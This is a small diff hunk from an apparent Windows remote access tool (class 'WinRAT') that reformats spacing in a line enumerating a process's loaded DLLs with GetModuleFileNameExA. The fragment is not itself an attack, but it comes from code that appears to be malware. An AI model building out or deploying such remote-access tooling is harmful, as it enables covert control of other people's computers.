@@ -400,7 +400,7 @@ class WinRAT:
 
 				if module == 0 or module == None:
 					continue
-				var_name = ctypes.create_string_buffer(b" "*100,100)
+				var_name = ctypes.create_string_buffer(b" " * 100,100)
 				kernel32api.GetModuleFileNameExA(proc, module, var_name, ctypes.sizeof(var_name))
 				nameval = '  DLL: '+var_name.raw.decode('ascii')
 				if var_name.raw.decode('ascii') == dllName:
